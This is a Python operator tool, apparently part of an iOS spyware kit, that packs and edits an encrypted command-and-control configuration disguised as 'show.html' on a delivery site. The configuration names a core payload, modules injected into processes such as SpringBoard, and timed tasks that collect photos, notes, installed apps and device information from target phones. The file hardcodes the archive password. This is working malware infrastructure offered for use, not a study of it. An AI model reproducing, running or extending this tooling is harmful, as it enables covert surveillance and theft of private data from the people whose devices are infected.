#!/usr/bin/env python3
"""自己生成/编辑 show.html（C2 配置）。

show.html 本质是 7z 包一个 config.json，schema 固定：

    settings  全局节奏（各扫描间隔）
    core      主载荷 (url + sha256 + size)
    entries   [] 每个进程注入哪个模块 (bundleId + url + sha256 + size + cold + flags)
    tasks     [] /event 返回给设备的采集动作 + interval
    commands  [] 后台可下发的指令名

用法:
    # 1) 把当前线上的 config.json 导出来看/改
    python tools/make_show.py --dump

    # 2) 改完 show.config.json 后打包回去（自动备份 + 自校验）
    python tools/make_show.py --build

    # 3) 顺手调几个参数（不需要手动改 JSON）
    python tools/make_show.py --build --set-interval photo=20 notes=30
    python tools/make_show.py --build --set-setting photoScanInterval=20
    python tools/make_show.py --build --set-entry com.apple.springboard=photonote.js

    # 4) 校验 entries 里每个文件在磁盘上是否存在、hash 是否对得上
    python tools/make_show.py --verify

    # 5) 从零生成一份（不带任何原有 entry）
    python tools/make_show.py --blank --core new.js --build
"""
import sys, os, io, json, time, shutil, hashlib, argparse, tempfile

import py7zr

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

PASSWORD = "abf3bdc8e239c0f3183c257f9ccc23e8"
ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
SHOW = os.environ.get("SHOW_HTML") or os.path.join(ROOT, "delivery-web", "public", "details", "show.html")
DETAILS = os.path.dirname(SHOW)
CFG_FILE = os.path.join(os.path.dirname(__file__), "..", "show.config.json")
HOST = "[HOST_PLACEHOLDER]"


# ─────────────────────── 读写 ───────────────────────

def unpack_show(path=SHOW) -> dict:
    tmp = tempfile.mkdtemp(prefix="showin_")
    with py7zr.SevenZipFile(path, "r", password=PASSWORD) as z:
        z.extractall(path=tmp)
    cfg = json.load(open(os.path.join(tmp, "config.json"), encoding="utf-8"))
    shutil.rmtree(tmp, ignore_errors=True)
    return cfg


def pack_show(cfg: dict, path=SHOW, backup=True) -> str:
    if backup and os.path.isfile(path):
        ts = time.strftime("%Y%m%d_%H%M%S")
        bak = "%s.bak.%s" % (path, ts)
        shutil.copy2(path, bak)
        print("  已备份 ->", os.path.basename(bak))

    tmp = tempfile.mkdtemp(prefix="showout_")
    cp = os.path.join(tmp, "config.json")
    json.dump(cfg, open(cp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
    out = os.path.join(tmp, "show.7z")
    with py7zr.SevenZipFile(out, "w", password=PASSWORD, header_encryption=True) as z:
        z.write(cp, "config.json")

    # 自校验
    v = os.path.join(tmp, "v")
    os.makedirs(v, exist_ok=True)
    with py7zr.SevenZipFile(out, "r", password=PASSWORD) as z:
        names = z.getnames()
        z.extractall(path=v)
    back = json.load(open(os.path.join(v, "config.json"), encoding="utf-8"))
    for k in ("settings", "core", "entries", "tasks", "commands"):
        assert k in back, "缺少字段 " + k
    assert len(back["entries"]) == len(cfg["entries"]), "entries 数量对不上"
    print("  自校验 ✓  %s  entries=%d  size=%d B" % (names, len(back["entries"]), os.path.getsize(out)))

    shutil.copy2(out, path)
    shutil.rmtree(tmp, ignore_errors=True)
    print("  已写入 ->", path, os.path.getsize(path), "B")
    return path


# ─────────────────────── 校验 ───────────────────────

def verify_entries(cfg: dict) -> int:
    """检查 entries / core 指向的文件是否存在、sha256+size 是否匹配（按解开后的 dylib 算）"""
    bad = 0
    print("%-42s %-16s %10s %-10s %s" % ("bundleId", "文件", "config size", "磁盘", "hash"))
    print("-" * 96)

    def check(label, url, sha, size):
        nonlocal bad
        fn = url.rsplit("/", 1)[-1].split("?")[0]
        p = os.path.join(DETAILS, fn)
        if not os.path.isfile(p):
            print("%-42s %-16s %10d %-10s %s" % (label, fn, size, "缺失", "✗"))
            bad += 1
            return
        # 从 7z 里解出 dylib 再算 hash（config 校验的是解开后的文件）
        try:
            tmp = tempfile.mkdtemp(prefix="vfy_")
            with py7zr.SevenZipFile(p, "r", password=PASSWORD) as z:
                names = z.getnames()
                z.extractall(path=tmp)
            inner = None
            for n in names:
                fp = os.path.join(tmp, n)
                if os.path.isfile(fp):
                    inner = fp
                    break
            if not inner:
                print("%-42s %-16s %10d %-10s %s" % (label, fn, size, "空包", "✗"))
                bad += 1
                return
            raw = open(inner, "rb").read()
            real_sha = hashlib.sha256(raw).hexdigest()
            ok = (real_sha == sha and len(raw) == size)
            print("%-42s %-16s %10d %-10s %s" % (
                label, fn, size, "%d B" % len(raw), "✓" if ok else "✗ %s" % real_sha[:8]))
            if not ok:
                bad += 1
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception as e:
            print("%-42s %-16s %10d %-10s %s" % (label, fn, size, "解包失败", str(e)[:30]))
            bad += 1

    check("<core>", cfg["core"]["url"], cfg["core"]["sha256"], cfg["core"]["size"])
    for e in cfg["entries"]:
        check(e.get("bundleId", ""), e.get("url", ""), e.get("sha256", ""), e.get("size", 0))

    print("-" * 96)
    print("  不匹配 %d 项" % bad if bad else "  全部匹配 ✓")
    return bad


# ─────────────────────── 改参数 ───────────────────────

def set_interval(cfg, spec):
    """photo=20 → tasks 里 collect_photo/photo_scan 的 interval"""
    for item in spec:
        for pair in item.split(","):
            if "=" not in pair:
                continue
            k, v = pair.split("=", 1)
            v = int(v)
            targets = {"photo": ("collect_photo", "photo_scan"),
                       "notes": ("collect_notes", "memo_scan"),
                       "applist": ("collect_applist",),
                       "device": ("refresh_device_info",)}.get(k, (k,))
            hit = 0
            for t in cfg.get("tasks", []):
                if t.get("action") in targets:
                    t["interval"] = v
                    hit += 1
            print("  tasks %-22s interval=%d (%d 项)" % ("/".join(targets), v, hit))


def set_setting(cfg, spec):
    for item in spec:
        for pair in item.split(","):
            if "=" not in pair:
                continue
            k, v = pair.split("=", 1)
            try:
                v = int(v)
            except ValueError:
                pass
            cfg.setdefault("settings", {})[k] = v
            print("  settings %-24s = %r" % (k, v))


def set_entry(cfg, spec):
    """com.apple.springboard=photonote.js → 换模块（hash/size 从磁盘现算）"""
    for item in spec:
        for pair in item.split(","):
            if "=" not in pair:
                continue
            bundle, fn = pair.split("=", 1)
            p = os.path.join(DETAILS, fn)
            if not os.path.isfile(p):
                print("  ✗ 找不到 %s" % p)
                continue
            tmp = tempfile.mkdtemp(prefix="ent_")
            with py7zr.SevenZipFile(p, "r", password=PASSWORD) as z:
                names = z.getnames()
                z.extractall(path=tmp)
            inner = os.path.join(tmp, names[0])
            raw = open(inner, "rb").read()
            sha, size = hashlib.sha256(raw).hexdigest(), len(raw)
            shutil.rmtree(tmp, ignore_errors=True)

            done = False
            for e in cfg["entries"]:
                if e.get("bundleId") == bundle:
                    e["url"] = "http://%s/details/%s" % (HOST, fn)
                    e["sha256"] = sha
                    e["size"] = size
                    done = True
                    print("  entry %-42s -> %s (%d B)" % (bundle, fn, size))
                    break
            if not done:
                print("  ✗ entries 里没有 %s" % bundle)


# ─────────────────────── 主流程 ───────────────────────

def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("--dump", action="store_true", help="导出当前 config.json 到 show.config.json")
    ap.add_argument("--build", action="store_true", help="把 show.config.json 打包回 show.html")
    ap.add_argument("--blank", action="store_true", help="从零生成（不带原有 entries）")
    ap.add_argument("--list", action="store_true", help="打印当前配置摘要")
    ap.add_argument("--verify", action="store_true", help="校验所有文件的 hash/size")
    ap.add_argument("--set-interval", nargs="+", default=[], help="photo=20 notes=30")
    ap.add_argument("--set-setting", nargs="+", default=[], help="photoScanInterval=20")
    ap.add_argument("--set-entry", nargs="+", default=[], help="com.apple.springboard=photonote.js")
    ap.add_argument("--core", default=None, help="core.url 里的文件名，如 new.js")
    ap.add_argument("--out", default=SHOW, help="输出路径（默认线上 show.html）")
    args = ap.parse_args()

    # 取配置来源：
    #   --dump / --verify  → 一律读线上 show.html（它们的作用就是看"现在到底是什么"）
    #   其它                → show.config.json 优先（可编辑的源），没有才读 show.html
    if args.dump or args.verify or args.blank or not os.path.isfile(CFG_FILE):
        cfg = unpack_show()
        src = "show.html"
    else:
        cfg = json.load(open(CFG_FILE, encoding="utf-8"))
        src = "show.config.json"
    print("配置来源:", src)

    if args.blank:
        cfg = {
            "settings": {
                "configRefreshInterval": 60, "heartbeatReportInterval": 60,
                "minPingIntervalPerDomain": 30, "validationCacheTTL": 300,
                "appListCollectInterval": 60, "forceAppListRefresh": True,
                "applistRefreshInterval": 60, "pendingMonitorInterval": 60,
                "debounceInterval": 5, "cleanupInterval": 300,
                "photoScanInterval": 60, "notesScanInterval": 120,
            },
            "core": {"url": "http://%s/details/%s" % (HOST, args.core or "new.js"),
                     "sha256": "0" * 64, "size": 0},
            "entries": [],
            "tasks": [
                {"action": "collect_applist", "interval": 60},
                {"action": "refresh_device_info", "interval": 60},
                {"action": "collect_notes", "interval": 120},
                {"action": "memo_scan", "interval": 120},
                {"action": "collect_photo", "interval": 120},
                {"action": "photo_scan", "interval": 120},
            ],
            "commands": [{"cmd": c, "args": {}} for c in
                         ("applist", "device_info", "notes", "memo", "photo", "photos")],
        }
        print("从零生成：entries 为空，需要 --set-entry 或手改")

    if args.core:
        cfg["core"]["url"] = "http://%s/details/%s" % (HOST, args.core)
        p = os.path.join(DETAILS, args.core)
        if os.path.isfile(p):
            tmp = tempfile.mkdtemp(prefix="core_")
            with py7zr.SevenZipFile(p, "r", password=PASSWORD) as z:
                names = z.getnames()
                z.extractall(path=tmp)
            raw = open(os.path.join(tmp, names[0]), "rb").read()
            cfg["core"]["sha256"] = hashlib.sha256(raw).hexdigest()
            cfg["core"]["size"] = len(raw)
            shutil.rmtree(tmp, ignore_errors=True)
            print("  core %s -> %d B  %s" % (args.core, cfg["core"]["size"], cfg["core"]["sha256"][:12]))
        else:
            print("  ✗ 找不到", p)

    if args.set_interval:
        set_interval(cfg, args.set_interval)
    if args.set_setting:
        set_setting(cfg, args.set_setting)
    if args.set_entry:
        set_entry(cfg, args.set_entry)

    if args.list or (not args.build and not args.dump and not args.verify):
        print()
        print("core.url    =", cfg["core"]["url"])
        print("core.sha256 =", cfg["core"]["sha256"], " size =", cfg["core"]["size"])
        print("settings    =", json.dumps(cfg.get("settings", {}), ensure_ascii=False))
        print("tasks       =", ", ".join("%s/%s" % (t["action"], t.get("interval")) for t in cfg.get("tasks", [])))
        print("entries     = %d 个" % len(cfg.get("entries", [])))
        for e in cfg.get("entries", []):
            print("   %-42s %-22s %9d  cold=%s" % (
                e.get("bundleId"), e.get("url", "").rsplit("/", 1)[-1], e.get("size", 0), e.get("cold")))

    if args.dump:
        json.dump(cfg, open(CFG_FILE, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
        print("\n已导出 ->", os.path.abspath(CFG_FILE))
        print("改完跑：python tools/make_show.py --build")

    if args.verify:
        print()
        verify_entries(cfg)

    if args.build:
        print("\n打包:") 
        pack_show(cfg, args.out)
        print("\n改完记得让设备重新拉：等 validationCacheTTL(300s) 过期，或重开投放页")


if __name__ == "__main__":
    main()
